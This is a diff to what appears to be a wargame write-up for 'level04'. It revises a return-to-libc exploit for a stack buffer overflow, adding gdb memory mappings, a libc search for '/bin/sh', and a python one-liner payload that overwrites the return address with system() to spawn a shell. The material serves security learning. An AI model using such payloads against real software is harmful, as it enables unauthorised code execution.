@@ -5,11 +5,39 @@ to be able to track the child and find when the overflow happen we can use in gd
 set follow-fork-mode child
 
 then try multiple workload until we find the return address location
-it turns out that it is located after 152 bytes from the buffer starts
+it turns out that it is located after 156 bytes from the buffer starts
 
-so we can fill the buffer with 152 character and then give system function address
+so we can fill the buffer with 156 character and then give system function address
 
-~$ python -c "print 'tsts'*36 + 'sh  ' + '\xec\x97\xf8\xf7' + '\xec\x97\xf8\xf7' +'\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7'" > /tmp/file
+we also find the address of "/bin/sh" and give it to system
+
+(gdb) info proc mappings
+process 2248
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fda000 0xf7fdb000     0x1000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+and we run the following:
+
+~$ python -c "print 'a'*156 +'\xd0\xae\xe6\xf7' + 'aaaa' + '\xec\x97\xf8\xf7'" > /tmp/file
 ~$ cat /tmp/file - | ./level04
 Give me some shellcode, k
 cd ../level05
